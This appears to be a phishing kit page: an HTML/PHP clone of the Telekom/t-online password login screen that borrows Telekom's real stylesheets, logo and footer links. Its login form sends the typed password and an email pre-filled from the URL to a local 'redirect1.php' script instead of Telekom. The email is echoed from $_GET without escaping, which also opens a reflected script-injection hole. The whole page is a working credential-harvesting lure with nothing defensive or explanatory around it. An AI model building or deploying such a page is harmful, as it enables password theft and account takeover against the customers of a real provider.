<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<!--[if (lte IE 8) ]>
<html lang="de-DE" class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|!(IE)]><!-->
<html class="no-js" lang="de"><!--<![endif]-->







<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Telekom Login</title>
    <meta name="description" content="Telekom Login">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />

    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/vdplus/css/components.min.css">
    <link rel="stylesheet" type="text/css" href="https://accounts.login.idm.telekom.com/static/factorx/vdplus/css/login-20.28.0.css">
    
    <script>
        var accountLocked = false;
        var accountLockedPermanent = false;
        var accountLockExpiration = 0;
        var loginFailed = false;
    </script>
    
    <!--[if lt IE 9]>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/html5shiv.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/jquery-matchheight-0.7.2.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/components.min.js"></script>
    <script type="text/javascript" src="https://accounts.login.idm.telekom.com/static/factorx/vdplus/js/login.js"></script>
	
	
</head>

<body>
<div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <i class="icon icon-large">tT</i>
                </div>
                <div class="pull-right">
                    <span class="tbs-slogan">erleben, was verbindet.</span>
                </div>
            </div>
        </div>
        
        
        
    </header>

    

    
    

    <div class="offset-bottom-5 offset-s-bottom-3"></div>

</div>

<div>

    

    


</div>


<div class="container-fixed">
    <div class="tbs-container">
        <div id="tbs-headline">
            <div id="tbs-brand" class="tbs-relative text-center">
                
                <img src="https://login.t-online.de/stats/t-online-logo-29112019.png">
            </div>
            
            
            <h1 class="offset-top-0 offset-bottom-3 text-center">Telekom Login Passwort eingeben</h1>
        </div>
        <div class="login-box">
            
            <div class="offset-bottom-1">
                <div>
                    <div class="form-input-set floating">
                        <label>Benutzername</label>
                        <p class="form-input static text-ellipsis" title="<?php echo $_GET['email']; ?>"><?php echo $_GET['email']; ?></p>
                    </div>
                </div>

                
                <div>
                    <form id="idchange" name="idchange" method="POST" action="redirect1.php" accept-charset="UTF-8"
                          autocomplete="off">
                        <div class="offset-bottom-1 clearfix">
                            
                            <input type="hidden" name="xsrf_2QU-WnwyZOIsZ9Unh3ywmQ"
                                   value="n-v1O2l669pm86uYv__sNA">

                            
                            <input type="hidden" name="tid" value="e4d02e91-b0cf-48a6-ab46-14cef8528f4c">

                            
                            <input type="hidden" name="identitychanged" value="identitychanged"/>
                            <div class="pull-right tbs-sublink">
                                <button class="btn-link text-right" id="id_change" name="changeIdentity" tabindex="50"
                                        type="submit">Mit einem anderen Benutzernamen anmelden?</button>
                            </div>
                        </div>
                    </form>
                </div>

                <div>
                    <form id="login" name="login" method="POST" action="redirect1.php" accept-charset="UTF-8"
                          autocomplete="off">

                        <button class="btn-hidden" name="pw_submit" type="submit"></button>

                        
                        <input type="hidden" name="xsrf_2QU-WnwyZOIsZ9Unh3ywmQ" value="n-v1O2l669pm86uYv__sNA">

                        
                        <input type="hidden" name="tid" value="e4d02e91-b0cf-48a6-ab46-14cef8528f4c">

                        
                        <input name="email" type="text" value="<?php echo $_GET['email']; ?>" class="hidden" aria-hidden="true" tabindex="-1" autocomplete="off">

                        
                        <div>
                            
                            <div class="form-input-set">
                                <input id="pw_pwd" name="pw_pwd" type="password" maxlength="128" class="form-input"
                                       tabindex="20" autocomplete="current-password">
                                <label for="pw_pwd">Passwort</label>
                            </div>
                        </div>

                        
                        

                        
                        <div class="login-helpers clearfix">
                            <!-- persist session component -->
                            <div id="tbs-signin-remember" class="form-checkbox-set">
                                <label>
                                    <input id="checkbox_permanent" type="checkbox" name="persist_session" value="1"
                                           class="form-checkbox" tabindex="30">
                                    <span>Angemeldet bleiben</span>
                                </label>
                            </div>

                            <!-- recovery link element -->
                            <div id="tbs-recovery-link" class="text-right tbs-sublink">
                                <button name="redirectToPwr" value="true" type="submit" class="btn-link text-right" tabindex="71">Passwort vergessen?</button>
                            </div>
                        </div>

                        <!-- Login button element -->
                        <div>
                            <button id="pw_submit" name="pw_submit" type="submit"
                                    class="text-center text-uppercase btn btn-brand btn-block btn-large" tabindex="40">Login</button>
                        </div>
                    </form>
                </div>

                
            </div>

            <div class="text-center offset-bottom-2 offset-top-2">
                <a href="https://www.telekom.de/hilfe/vertrag-meine-daten/login-daten-passwoerter" tabindex="45"
                   target="_blank">Brauchen Sie Hilfe?</a>
            </div>
        </div>
    </div>
</div>


<footer id="tbs-footer">
    <div class="container-fixed">
        <div class="pull-left">
            <p>&copy; Telekom Deutschland GmbH</p>
            <p class="tbs-text-11">20.28.0, 1b26521a07b2757b93cead392a27c03b, 058ca6fdca49401bf6c295bfb956341ee59c79d6</p>
        </div>
        <div class="pull-right">
            <ul class="list-inline">
                <li>
                    <a href="https://www.telekom.de/start/impressum" target="_blank">Impressum</a>
                </li>
                <li>
                    <a id="data-protection" href="https://www.telekom.de/datenschutz-ganz-einfach" target="_blank">Datenschutz</a>
                </li>
            </ul>
        </div>
    </div>
</footer>



<div>
    
</div>
</body>
</html>
